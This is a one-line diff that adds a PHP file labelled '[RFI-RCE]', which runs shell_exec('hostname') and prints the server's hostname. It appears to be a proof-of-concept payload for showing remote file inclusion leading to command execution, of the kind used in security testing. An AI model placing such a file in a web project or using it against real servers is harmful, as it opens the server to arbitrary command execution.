@@ -1,0 +1,1 @@
+<?php echo "[RFI-RCE] Hostname via shell: " . shell_exec('hostname'); ?>
